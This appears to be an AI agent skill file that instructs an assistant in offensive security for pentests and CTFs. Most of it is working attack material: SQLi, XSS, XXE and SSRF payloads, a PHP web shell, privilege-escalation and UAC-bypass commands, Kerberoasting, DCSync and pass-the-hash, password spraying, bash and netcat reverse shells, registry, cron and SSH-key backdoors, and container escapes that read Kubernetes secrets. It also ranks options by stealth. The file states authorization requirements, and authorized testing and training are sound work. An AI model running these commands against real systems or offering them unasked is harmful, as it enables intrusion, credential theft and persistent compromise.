---
name: offensive-security
description: "Use when performing authorized penetration testing, CTF challenges, red team exercises, or security research. Triggers on: pentest, CTF, red team, OSCP, hack the box, privilege escalation, privesc, lateral movement, active directory attack, AD attack, Kerberoasting, ASREPRoasting, BloodHound, Mimikatz, credential dumping, DCSync, pass-the-hash, enumeration, recon, OSINT, web app attack, SQLi, XSS, SSRF, LFI, file upload bypass, password cracking, hashcat, password spray, persistence backdoor, container escape, docker escape, cloud misconfiguration, AWS IAM escalation, Kubernetes attack."
---

# Offensive Security

Provides concrete techniques, tools, and commands for authorized penetration testing, CTF
competitions, red team exercises, and security research.

**AUTHORIZATION REQUIRED**: Written scope and explicit permission must exist before any
engagement. Confirm target ownership or CTF context before proceeding.

## When to Use

- Authorized penetration tests with defined scope
- CTF competitions (HackTheBox, TryHackMe, PicoCTF, etc.)
- Red team / purple team exercises
- Security research in isolated lab environments
- OSCP/certification exam practice

## When NOT to Use

- Unauthorized systems — any target without explicit written permission
- Production systems outside the defined engagement scope
- Detection evasion for malicious purposes or to harm real users
- Exfiltrating real personal data beyond proof-of-concept

---

## Recon and Initial Access

**Passive OSINT** — use `subfinder`/`theHarvester` for subdomains/emails; `shodan`/`crt.sh` for exposed services; `trufflehog` for leaked git secrets.
```bash
whois domain.com && dig domain.com ANY
subfinder -d domain.com -silent | tee subs.txt
theHarvester -d domain.com -b all
shodan search "org:Company Name"
trufflehog https://github.com/company/repo
```

**Active Scanning**
```bash
nmap -sC -sV -p- -T4 -oA full target      # all ports + service detection
rustscan -a target -- -sC -sV              # fast scan + nmap scripts
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc 200,301,302,403
nuclei -u https://target -t ~/nuclei-templates/  # template-based vuln scan
```

**Service-Specific Enum**
```bash
enum4linux -a 10.10.10.10                  # SMB: users, shares, policies
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"  # LDAP dump
snmpwalk -v2c -c public 10.10.10.10 && redis-cli -h 10.10.10.10 INFO
```

---

## Web Application Attacks

**Injection**
```bash
sqlmap -u "http://target/page?id=1" --batch --dbs   # automated SQLi (-r request.txt for Burp)
' OR '1'='1'--    # manual SQLi; command injection operators: ; | || & && ` $()
```

**XSS / SSRF / XXE**
```
# XSS
<script>alert(1)</script>  <img src=x onerror=alert(1)>  <svg onload=alert(1)>
# SSRF
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS
http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"
# XXE
<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
```

**File Upload / LFI**
```
shell.php.jpg  shell.php5  shell.phtml  shell.phP   # extension bypass
GIF89a<?php system($_GET['cmd']); ?>                # magic bytes bypass
php://filter/convert.base64-encode/resource=index.php  # PHP wrapper LFI
../../../../etc/passwd   ....//....//etc/passwd      # path traversal
```

**JWT / API**
```bash
python3 jwt_tool.py TOKEN -X n   # none algorithm
python3 jwt_tool.py TOKEN -X k   # RS256→HS256 confusion
hashcat -a 0 -m 16500 jwt.txt rockyou.txt   # brute-force secret
# IDOR: curl https://api.target/users/2 -H "Authorization: Bearer USER1_TOKEN"
# Mass assignment: POST with {"role":"admin","is_admin":true}
```

---

## Privilege Escalation — Linux

**Quick Wins (run first)**
```bash
linpeas.sh                                  # automated enum (highlights findings)
sudo -l                                     # sudo permissions
find / -perm -4000 -type f 2>/dev/null     # SUID binaries → check GTFOBins
getcap -r / 2>/dev/null                    # capabilities: cap_setuid → setuid(0)
cat /etc/crontab; ls /etc/cron.d/          # writable cron scripts
```

**Exploits**
```bash
# Sudo shell escapes
sudo vim -c ':!/bin/bash'
sudo find . -exec /bin/bash \; -quit

# SUID binary exploit (GTFOBins)
find . -exec /bin/bash -p \; -quit         # if find is SUID
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'  # if cap_setuid

# Writable /etc/passwd → add root user
echo 'r00t::0:0:root:/root:/bin/bash' >> /etc/passwd && su r00t

# Kernel exploits
uname -a; searchsploit "Linux Kernel $(uname -r | cut -d- -f1)"
# CVE-2021-4034 PwnKit, CVE-2022-0847 Dirty Pipe, CVE-2016-5195 DirtyCow
```

---

## Privilege Escalation — Windows

**Quick Wins**
```cmd
winPEASx64.exe quiet
whoami /priv                               rem check SeImpersonatePrivilege
wmic service get name,pathname | findstr /i /v """  rem unquoted service paths
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
findstr /si password *.xml *.ini *.config  rem credential search
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Token / Service Exploits**
```cmd
PrintSpoofer.exe -i -c cmd                 rem SeImpersonate → SYSTEM (Win10/2016+)
GodPotato.exe -cmd "cmd /c whoami"         rem SeImpersonate (Win8/2012+)
sc config svc binpath= "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe" && sc start svc
```

**UAC Bypass**
```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty ... -Name "(default)" -Value "cmd /c payload.exe" -Force
Start-Process fodhelper.exe
```

---

## Active Directory Attacks

**Enumeration**
```bash
bloodhound-python -u user -p pass -ns 10.10.10.10 -d domain.local -c All --zip
crackmapexec smb 10.10.10.0/24 -u user -p pass --users --groups
ldapsearch -x -H ldap://dc -D 'user@domain.local' -w pass -b "DC=domain,DC=local"
```

**Kerberos Attacks**
```bash
# Kerberoasting (TGS-REP crack → service account passwords)
GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:pass -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt

# ASREPRoasting (no preauth required accounts)
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

**Credential Dumping and Lateral Movement**
```bash
secretsdump.py domain.local/user:pass@dc.domain.local -just-dc   # DCSync all hashes
crackmapexec smb 10.10.10.10 -u administrator -H <ntlm_hash>     # pass-the-hash
psexec.py -hashes :hash administrator@10.10.10.10
evil-winrm -i 10.10.10.10 -u administrator -H hash
```

**Ticket Attacks**
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt
.\Rubeus.exe asktgt /user:admin /rc4:<ntlm> /ptt    # overpass-the-hash
# Golden ticket (needs krbtgt hash + domain SID)
kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt
```

---

## Password Attacks

**Hash Cracking**
```bash
hashid -m 'hash'                            # identify hash type + hashcat mode
hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule   # NTLM
hashcat -m 5600 ntlmv2.txt rockyou.txt     # NetNTLMv2 (Responder captures)
hashcat -m 1800 shadow.txt rockyou.txt     # Linux sha512crypt
hashcat -m 3200 bcrypt.txt wordlist.txt    # bcrypt (slow)
john --wordlist=rockyou.txt hashes.txt     # auto-detect format
```

**Spraying / Online Brute**
```bash
kerbrute passwordspray -d domain.local users.txt 'Password123'  # Kerberos spray
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Spring2024!' --continue-on-success
hydra -L users.txt -P passes.txt 10.10.10.10 http-post-form "/login:u=^USER^&p=^PASS^:Invalid"
```

**Wordlist Generation** — `cewl -d 2 -m 5 -w cewl.txt https://target.com` (scrape site); `crunch 8 10 -t Company@@@ -o custom.txt` (pattern-based).

---

## Lateral Movement and Persistence

**Reverse Shells**
```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1                                    # Linux bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe
```

**Windows Persistence**
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Temp\backdoor.exe"
schtasks /create /tn "SystemCheck" /tr "C:\Temp\backdoor.exe" /sc onlogon /ru System
sc create "SvcUpdate" binPath= "C:\Temp\backdoor.exe" start= auto obj= LocalSystem
```

**Linux Persistence**
```bash
echo "@reboot /tmp/.update" >> /etc/crontab           # cron persistence
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys  # SSH key backdoor
printf '[Service]\nExecStart=/tmp/.update\nRestart=always\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/svc.service && systemctl enable svc.service
```

---

## Cloud / Container Offensive

**Cloud Recon**
```bash
aws sts get-caller-identity                                    # who am I?
aws s3 ls s3://bucket --no-sign-request                       # unauthenticated S3
aws secretsmanager list-secrets                               # enumerate secrets
aws iam list-attached-user-policies --user-name me            # enum permissions
aws iam attach-user-policy --user-name me --policy-arn arn:aws:iam::aws:policy/AdministratorAccess  # privesc via iam:AttachUserPolicy
# SSRF → http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Container Escape**
```bash
ls /.dockerenv; cat /proc/self/status | grep Cap   # detect + decode capabilities
fdisk -l && mount /dev/sda1 /mnt/h && chroot /mnt/h  # privileged container → host FS
docker run -v /:/mnt --rm -it alpine chroot /mnt sh  # via mounted docker socket
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
curl -k https://kubernetes.default.svc/api/v1/namespaces/default/secrets -H "Authorization: Bearer $TOKEN"
```

---

## Output Format

For each technique: state the **goal**, provide **exact commands** with placeholders, describe
**expected output**, and identify the **next step** in the attack chain.
When presenting multiple options, order by: stealth > reliability > speed.

**Finding report template:**
```
[RED] FINDING: <title>
Severity: Critical | High | Medium | Low
MITRE ATT&CK: <Tactic> — <Technique ID, e.g. T1078>
Detail: <what is vulnerable and how it would be exploited>
Proof of concept:
  1. <step 1>
  2. <step 2>
Remediation: <what to fix and how>
```

---

## Verification Checklist

Before:
- [ ] Written authorization in hand (scope, IPs/domains, dates, rules of engagement)
- [ ] VPN / isolated network confirmed; logging enabled for report evidence
- [ ] Cleanup plan defined (remove shells, persistence, uploaded files)

During:
- [ ] Stay within scope; document findings with timestamps and screenshots
- [ ] Verify exploits in lab first; avoid destructive actions (delete, encrypt, crash)
